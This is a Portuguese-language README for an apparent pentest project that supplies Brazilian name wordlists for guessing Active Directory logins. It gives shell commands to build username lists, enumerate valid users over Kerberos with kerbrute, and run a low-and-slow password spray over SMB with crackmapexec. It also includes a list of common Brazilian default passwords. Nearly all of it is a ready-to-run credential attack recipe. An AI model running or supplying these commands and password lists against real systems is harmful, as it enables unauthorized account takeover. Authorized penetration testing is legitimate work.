# Wordlist de nomes brasileiros  
> Este projeto surgiu no meio de um pentest aonde eu tinha somente acesso ao protocolo kerberos e o smb e precisava adivinhar logins de rede para realizar uma ataque de passwordspray.  

## Arquivos    
#### first-name-pt-br.txt:  
Contém uma lista de primeiros nomes brasileiros como por exemplo ana, carlos, henrique, etc...  

#### second-name-pt-br.txt:  
Este contém uma lista de sobrenomes brasileiros como carvalho, silva, souza, etc...  

#### name_and_surname.txt:  
Este arquivo contém uma mesclagem de primeiro nome e sobrenome.  

#### wordlist_login_pt_br.txt:  
Uma wordlist criada com o script python ```namemash.py``` para utilizar como teste para adivinhar logins validos.  

#### namemash.py:  
Script python para gerar padrões de login de rede.  

## Gerando logins:  
```bash
Smaug@erebor:~$ wget https://gist.githubusercontent.com/Outs1d3r-Net/4d9d674ce2885e282409fc2253f5df6b/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py
Smaug@erebor:~$ for s in $(cat second-name-pt-br.txt);do for p in $(cat first-name-pt-br.txt);do echo "$p $s" >> name.txt;done;done
Smaug@erebor:~$ cat name.txt| sort | uniq > name_and_surname.txt; rm name.txt
Smaug@erebor:~$ python3 namemash.py name_and_surname.txt >> wordlist_login_pt_br.txt
```  
## Descobrindo logins validos:  
```
Smaug@erebor:~$ nmap -p88 192.168.0.1/24 --open
Smaug@erebor:~$ git clone https://github.com/ropnop/kerbrute; cd kerbrute
Smaug@erebor:~$ go build .
Smaug@erebor:~$ ./kerbrute userenum -d AD_NAME.LOCAL wordlist_login_pt_br.txt
```
#### pass.txt:  
```
Mudar@123
P@ssw0rd
Pa55w.rd
Microsoft.123
Musc1234
Brasil@2020
Mudar123@
Busca123
Aval1234
Auto1234
Brasil@2019
Mudar123*
Bela@123
Senha123@
Mudar123
Email@123
Cambiar123@
Brasil123@
Mudar321@
q1w2e3R$
Brasil@1234
abcd=1234
Deus@123
Brasil@123
Brasil123
Cambiar@123
123qwe...
Mudar1234!
Jesus@123
Jesus@10
Senha231
Maria@123
Brasil@321
Password@2022
Brasil@1991
```  
## Ataque de LOW-AND-SLOW PasswordSpray:  
```bash
Smaug@erebor:~$ for p in $(cat pass.txt);do crackmapexec smb 192.168.0.10 -u valid_users.txt -p "$p" -d AD_NAME.LOCAL; sleep 400;done
```
  
:frog:  
